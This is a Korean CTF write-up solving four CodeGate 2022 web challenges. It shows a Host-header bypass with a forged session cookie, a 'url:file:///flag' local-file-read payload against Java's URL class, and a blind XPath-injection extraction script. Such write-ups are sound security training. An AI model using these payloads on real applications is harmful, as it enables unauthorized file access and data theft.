---
title: "CodeGate2022 WriteUp(Web)"
date: 2022-08-29T23:26:18+09:00
description: "CTF WriteUp (Web) - CodeGate2022"
categories:
- web
- ctf
- writeup
tags:
- ctf
- web
- writeup
- codegate
keywords:
- ctf
toc: true
draft: false
---
## Cafe

- Problem
    
    ![Untitled](/images/20220829/Untitled.png)
    

문제가 잘못 출제된것 같음. bot.py 파일에 admin 로그인 정보가 박혀있어서 로그인 후 바로 인증. (본래 문제의 의도는 XSS를 터트려서 관리자의 글을 읽어서 Flag를 획득하는 것)

```python
#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import sys

options = webdriver.ChromeOptions()

options.add_argument('--headless')
options.add_argument('--disable-logging')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')
#options.add_argument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")

driver = webdriver.Chrome(ChromeDriverManager().install(),options=options)
driver.implicitly_wait(3)

driver.get('http://3.39.55.38:1929/login')
driver.find_element_by_id('id').send_keys('admin')
driver.find_element_by_id('pw').send_keys('$MiLEYEN4')
driver.find_element_by_id('submit').click()
time.sleep(2)

driver.get('http://3.39.55.38:1929/read?no=' + str(sys.argv[1]))
time.sleep(2)

driver.quit()
```

Flag ⇒ codegate2022{4074a143396395e7196bbfd60da0d3a7739139b66543871611c4d5eb397884a9}

다른 풀이(의도한 풀이) : [https://beerpwn.github.io/ctf/2022/Codegate_CTF/web/web_cafe/](https://beerpwn.github.io/ctf/2022/Codegate_CTF/web/web_cafe/)

## Superbee

- Problem
    
    ![Untitled](/images/20220829/Untitled%201.png)
    

해당 문제는 GoLang으로 된 문제로, 소스코드 분석을 통한 로직에러(?)를 찾는 문제다. 먼저 주어진 설정 파일을 확인하면 아래와 같다.

```
app_name = superbee
auth_key = [----------REDEACTED------------]
id = admin
password = [----------REDEACTED------------]
flag = [----------REDEACTED------------]
```

아래 소스코드를 보면 특이한 점을 확인 할 수 있다.

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"bytes"
	"github.com/beego/beego/v2/server/web"
)

func AesEncrypt(origData, key []byte) ([]byte, error) {
	padded_key := Padding(key, 16)
	block, err := aes.NewCipher(padded_key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

...

func (this *BaseController) Prepare() {
	controllerName, _ := this.GetControllerAndAction()
	session := this.Ctx.GetCookie(Md5("sess"))

	if controllerName == "MainController" {
		if session == "" || session != Md5(admin_id + auth_key) {
			this.Redirect("/login/login", 403)
			return
		}
	} else if controllerName == "LoginController" {
		if session != "" {
			this.Ctx.SetCookie(Md5("sess"), "")
		}
	} else if controllerName == "AdminController" {
		domain := this.Ctx.Input.Domain()

		if domain != "localhost" {
			this.Abort("Not Local")
			return
		}
	}
}

func (this *MainController) Index() {
	this.TplName = "index.html"
	this.Data["app_name"] = app_name
	this.Data["flag"] = flag
	this.Render()
}

...

func (this *AdminController) AuthKey() {
	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
}

func main() {
	app_name, _ = web.AppConfig.String("app_name")
	auth_key, _ = web.AppConfig.String("auth_key")
	auth_crypt_key, _ = web.AppConfig.String("auth_crypt_key")
	admin_id, _ = web.AppConfig.String("id")
	admin_pw, _ = web.AppConfig.String("password")
	flag, _ = web.AppConfig.String("flag")

	web.AutoRouter(&MainController{})
	web.AutoRouter(&LoginController{})
	web.AutoRouter(&AdminController{})
	web.Run()
}
```

바로 `auth_crypt_key` 라는 것이 app.conf 파일에 없다는 것이다.

문제의 핵심은 `auth_key` 의 값을 뽑아내고, 이를 이용하여 session을 만들어서 /main/index로 이동하여 인증해주면 된다.

- 참고 : beego의 AutoRouter는 `{controller}/{method}` 로 라우팅하므로 AdminController에 접근하기 위해서는, /admin/authkey 로 가면 된다.
    
    ![[https://beego.vip/docs/mvc/controller/router.md](https://beego.vip/docs/mvc/controller/router.md)](/images/20220829/Untitled%202.png)
    
    [https://beego.vip/docs/mvc/controller/router.md](https://beego.vip/docs/mvc/controller/router.md)
    

다음 코드를 보면, AdminController에 접근하기 위해서는 localhost여야 하는데, 이는 그냥 버프에서 host명을 localhost로 바꿔주면 된다.

```go
...
else if controllerName == "AdminController" {
		domain := this.Ctx.Input.Domain()

		if domain != "localhost" {
			this.Abort("Not Local")
			return
		}
	}
...
```

```
[ Request ]
GET /admin/authkey HTTP/1.1
Host: localhost:30001
...
Connection: close

[ Response ]
HTTP/1.1 200 OK
...

00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
```

위 AES128 암호문을 복호화하면 다음과 같이 나온다.

```python
from Crypto.Cipher import AES
key = b'\x10' * 16
aes = AES.new(key, AES.MODE_CBC, key)
plaintext = aes.decrypt(bytes.fromhex('00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607'))
print(plaintext)

$ python3 sol.py
b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
```

이제 문제의 핵심이었던, Session을 만들고 Cookie로 설정한 다음에 index에 요청을 날리면 된다.

```
[ Request ]
GET /main/index HTTP/1.1
Host: 3.39.49.174:30001
Cookie: f5b338d6bca36d47ee04d93d08c57861=e52f118374179d24fa20ebcceb95c2af;
...
Connection: close

[ Response ]
HTTP/1.1 200 OK
...
Connection: close

<html>
    <head>
        <title>superbee</title>
    </head>
    <body>
        <h3>Index</h3>
        codegate2022{d9adbe86f4ecc93944e77183e1dc6342}
    </body>
</html>
```

## Babyfirst

- Problem
    
    ![Untitled](/images/20220829/Untitled%203.png)
    

핵심은 아래 코드에 있음. 글을 작성 할 시, 내용에 [URL주소]를 입력하면 해당 주소의 컨텐츠를 읽어서 가지고와 img 태그에 넣어서 출력.

```java
private static String lookupImg(String memo) {
    Matcher matcher = Pattern.compile("(\\[[^\\]]+\\])").matcher(memo);
    if (!matcher.find()) {
        return "";
    }
    String img = matcher.group();
    String tmp = img.substring(1, img.length() - 1).trim().toLowerCase();
    Matcher matcher2 = Pattern.compile("^[a-z]+:").matcher(tmp);
    if (!matcher2.find() || matcher2.group().startsWith("file")) {
        return "";
    }
    String urlContent = "";
    try {
        BufferedReader in = new BufferedReader(new InputStreamReader(new URL(tmp).openStream()));
        while (true) {
            String inputLine = in.readLine();
            if (inputLine != null) {
                urlContent = urlContent + inputLine + "\n";
            } else {
                in.close();
                try {
                    return memo.replace(img, "<img src='data:image/jpeg;charset=utf-8;base64," + new String(Base64.getEncoder().encode(urlContent.getBytes("utf-8"))) + "'><br/>");
                } catch (Exception e) {
                    return "";
                }
            }
        }
    } catch (Exception e2) {
        return "";
    }
}
```

문제는 file 스킴을 사용할 수 없는 것인데 문제의 핵심은 URL class다.  아래의 JDK-11 소스코드를 보면 특이점을 발견할 수 있다.

```java

...
public URL(URL context, String spec, URLStreamHandler handler)
        throws MalformedURLException
    {
        String original = spec;
        int i, limit, c;
        int start = 0;
        String newProtocol = null;
        boolean aRef=false;
        boolean isRelative = false;

        // Check for permission to specify a handler
        if (handler != null) {
            SecurityManager sm = System.getSecurityManager();
            if (sm != null) {
                checkSpecifyHandler(sm);
            }
        }

        try {
            limit = spec.length();
            while ((limit > 0) && (spec.charAt(limit - 1) <= ' ')) {
                limit--;        //eliminate trailing whitespace
            }
            while ((start < limit) && (spec.charAt(start) <= ' ')) {
                start++;        // eliminate leading whitespace
            }

            if (spec.regionMatches(true, start, "url:", 0, 4)) {
                start += 4;
            }
            if (start < spec.length() && spec.charAt(start) == '#') {
                /* we're assuming this is a ref relative to the context URL.
                 * This means protocols cannot start w/ '#', but we must parse
                 * ref URL's like: "hello:there" w/ a ':' in them.
                 */
                aRef=true;
            }
...
```

바로 ‘url:’ 문자가 들어가면 그 뒤인 4번째 부터 URL로 인식하여 사용한다는 것이다. 

그리하여 아래 Payload를 Memo Context에 넣으면 base64로 Flag가 받아와진다.

```
[url:file:///flag]
```

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Simple Memo</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        ...
    </style>
  </head>
<body>
      <!-- Begin page content -->
    <main role="main" class="container">
        <img src='data:image/jpeg;charset=utf-8;base64,Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg=='><br/>
    </main>
</body>
</html>
```

Flag ⇒ codegate2022{8953bf834fdde34ae51937975c78a895863de1e1}

## MyBlog

- Problem
    
    ![Untitled](/images/20220829/Untitled%204.png)
    

해당 문제의 핵심이 되는 부분은 다음과 같다.

```java
...
private String[] doReadArticle(HttpServletRequest req) {
    String id = (String) req.getSession().getAttribute("id");
    String idx = req.getParameter("idx");
    if ("null".equals(id) || idx == null) {
        return null;
    }
    try {
        Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new InputSource(new FileInputStream(new File(this.tmpDir + "/article/", id + ".xml"))));
        XPath xpath = XPathFactory.newInstance().newXPath();
        return new String[]{decBase64(((String) xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING)).trim()), decBase64(((String) xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING)).trim())};
    } catch (Exception e) {
        System.out.println(e.getMessage());
        return null;
    }
}
...
```

자세히 보면 return 할 때 XPath를 사용하는 것을 알 수 있는데, 별다른 Filtering이 존재하지 않는다. 그러므로 우리는 XPath Injection에 취약한 것을 알 수 있다.

실제로 다음 URL로 접근하면 성공적으로 Payload가 들어가 본래 1을 요청했던것과 같은 반응이 뜨는 것을 확인할 수 있다.

```
http://3.39.79.180/blog/read?idx=1'+or+1='
```

이제 Flag를 봐야하는데 Flag의 위치를 살펴보면 아래의 DockerFile에 명시되어 있다.

```docker
...
RUN echo 'flag=codegate2022{md5(flag)}' >> /usr/local/tomcat/conf/catalina.properties
...
```

catalina.properties 파일에 flag가 적힌것인데, 처음에는 파일을 읽어야하는줄 알았다. 그러나 해당 값이 들어가면 시스템 프로퍼티에 저장되어 해당 프로퍼티를 읽으면된다. 그리고 XPath는 시스템 프로퍼티를 읽을 수 있는 기능을 제공한다.

[https://developer.mozilla.org/ko/docs/Web/XPath/Functions/system-property](https://developer.mozilla.org/ko/docs/Web/XPath/Functions/system-property)

이를 통해 다음과 같이 실험을 했고 참/거짓 반응 차이를 통해 성공적으로 먹히는 것을 확인 할수 있었다.

```
http://3.39.79.180/blog/read?idx=1'+and+starts-with(system-property('flag'),'codegate2022%7b')+or+1='
```

그리고 아래 스크립트를 만들어 돌려서 최종 Flag를 획득했다.

```python
import requests

url = "http://3.39.79.180/blog/read"
dic = "abcdefghijklmnopqrstuvwxyz0123456789"
cookie = {
    'JSESSIONID': '32EF74FA3B3F0E61927AFED2F255B2BE'
}
flag = 'bcb'
for j in range(33):
    for i in dic:
        params = {"idx" : "1' and starts-with(system-property('flag'),'codegate2022{"+ str(flag) + str(i) +"') or 1='"}
        res = requests.get(url, params=params, cookies=cookie)
        if 'aaa' in res.text:
            flag += i
            # print(res.text)
            print(flag)
```

Flag ⇒ codegate2022{bcbbc8d6c8f7ea1924ee108f38cc000f}